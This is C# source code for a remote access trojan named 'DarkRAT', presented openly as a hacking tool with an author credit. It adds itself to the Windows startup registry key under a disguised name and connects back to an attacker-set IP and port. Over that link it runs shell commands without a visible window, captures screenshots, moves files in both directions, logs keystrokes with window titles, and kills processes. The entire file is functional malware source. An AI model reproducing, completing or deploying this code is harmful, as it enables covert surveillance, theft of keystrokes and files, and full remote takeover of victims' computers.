// C# RAT - Full-featured Remote Access Tool (Skeleton)
// Author: Magician Slime  https://github.com/magicianKaif/
// Note: Implemented core structure, replace with actual payloads.
using System;
using System.IO;
using System.Net.Sockets;
using System.Diagnostics;
using System.Text;
using System.Threading;
using Microsoft.Win32;
using System.Drawing;
using System.Drawing.Imaging;
using System.Windows.Forms;
using System.Runtime.InteropServices;

namespace DarkRAT
{
    class Program
    {
        static string ip = "192.168.1.100"; // Replace With Your ip Address
        static int port = 4444; // Replace With Your Port 

        [DllImport("user32.dll")]
        static extern IntPtr GetForegroundWindow();
        [DllImport("user32.dll")]
        static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);

        static void Main(string[] args)
        {
            AddToStartup();
            ConnectToServer();
        }

        static void AddToStartup()
        {
            string path = System.Reflection.Assembly.GetExecutingAssembly().Location;
            RegistryKey key = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            key.SetValue("WindowsClient", path);
        }

        static void ConnectToServer()
        {
            while (true)
            {
                try
                {
                    using (TcpClient client = new TcpClient(ip, port))
                    using (NetworkStream stream = client.GetStream())
                    {
                        SendData(stream, "[*] Connected");

                        byte[] buffer = new byte[4096];
                        int bytesRead;

                        while ((bytesRead = stream.Read(buffer, 0, buffer.Length)) > 0)
                        {
                            string command = Encoding.UTF8.GetString(buffer, 0, bytesRead).Trim();

                            if (command == "exit")
                                break;
                            else if (command.StartsWith("cd "))
                            {
                                string path = command.Substring(3);
                                Directory.SetCurrentDirectory(path);
                                SendData(stream, "[+] Changed directory");
                            }
                            else if (command == "getscreen")
                            {
                                SendScreenshot(stream);
                            }
                            else if (command.StartsWith("download "))
                            {
                                string filePath = command.Substring(9);
                                SendFile(stream, filePath);
                            }
                            else if (command.StartsWith("upload "))
                            {
                                string[] parts = command.Split(new[] { ' ' }, 2);
                                ReceiveFile(stream, parts[1]);
                            }
                            else if (command == "keylogstart")
                            {
                                StartKeylogging(stream);
                            }
                            else if (command == "proc")
                            {
                                SendProcesses(stream);
                            }
                            else if (command.StartsWith("killproc "))
                            {
                                string procName = command.Substring(9);
                                KillProcess(procName);
                                SendData(stream, "[+] Process killed");
                            }
                            else
                            {
                                SendData(stream, ExecuteCommand(command));
                            }
                        }
                    }
                }
                catch
                {
                    Thread.Sleep(10000);
                }
            }
        }

        static string ExecuteCommand(string cmd)
        {
            ProcessStartInfo psi = new ProcessStartInfo("cmd.exe", "/c " + cmd)
            {
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                UseShellExecute = false,
                CreateNoWindow = true
            };

            using (Process proc = Process.Start(psi))
            {
                string output = proc.StandardOutput.ReadToEnd();
                string error = proc.StandardError.ReadToEnd();
                return output + error;
            }
        }

        static void SendData(NetworkStream stream, string data)
        {
            byte[] message = Encoding.UTF8.GetBytes(data);
            stream.Write(message, 0, message.Length);
        }

        static void SendScreenshot(NetworkStream stream)
        {
            using (Bitmap bmp = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height))
            using (Graphics g = Graphics.FromImage(bmp))
            {
                g.CopyFromScreen(0, 0, 0, 0, bmp.Size);
                using (MemoryStream ms = new MemoryStream())
                {
                    bmp.Save(ms, ImageFormat.Jpeg);
                    byte[] imageData = ms.ToArray();
                    SendData(stream, "[IMG]" + imageData.Length);
                    stream.Write(imageData, 0, imageData.Length);
                }
            }
        }

        static void SendFile(NetworkStream stream, string filePath)
        {
            if (File.Exists(filePath))
            {
                byte[] fileData = File.ReadAllBytes(filePath);
                SendData(stream, "[FILE]" + fileData.Length + "|" + Path.GetFileName(filePath));
                stream.Write(fileData, 0, fileData.Length);
            }
            else
            {
                SendData(stream, "[-] File not found");
            }
        }

        static void ReceiveFile(NetworkStream stream, string fileName)
        {
            byte[] buffer = new byte[4096];
            using (MemoryStream ms = new MemoryStream())
            {
                int bytesRead;
                while ((bytesRead = stream.Read(buffer, 0, buffer.Length)) > 0)
                {
                    ms.Write(buffer, 0, bytesRead);
                }
                File.WriteAllBytes(fileName, ms.ToArray());
                SendData(stream, "[+] File received and saved");
            }
        }

        static void StartKeylogging(NetworkStream stream)
        {
            SendData(stream, "[*] Keylogging started");
            while (true)
            {
                Thread.Sleep(10);
                string keys = HookKeys();
                if (!string.IsNullOrEmpty(keys))
                {
                    SendData(stream, "[KEYLOG]" + keys);
                }
            }
        }

        static string HookKeys()
        {
            StringBuilder sb = new StringBuilder();
            IntPtr hwnd = GetForegroundWindow();
            StringBuilder windowText = new StringBuilder(256);
            GetWindowText(hwnd, windowText, windowText.Capacity);

            foreach (Keys key in Enum.GetValues(typeof(Keys)))
            {
                if (Control.ModifierKeys == Keys.None && NativeMethods.GetAsyncKeyState((int)key) == -32767)
                {
                    sb.Append(key.ToString() + " (Window: " + windowText + ") ");
                }
            }
            return sb.ToString();
        }

        static void SendProcesses(NetworkStream stream)
        {
            StringBuilder sb = new StringBuilder();
            foreach (Process proc in Process.GetProcesses())
            {
                sb.AppendLine(proc.ProcessName + " (PID: " + proc.Id + ")");
            }
            SendData(stream, "[PROCLIST]" + sb.ToString());
        }

        static void KillProcess(string procName)
        {
            foreach (Process proc in Process.GetProcessesByName(procName))
            {
                proc.Kill();
            }
        }
    }

    internal static class NativeMethods
    {
        [DllImport("user32.dll")]
        public static extern short GetAsyncKeyState(int vKey);
    }
}
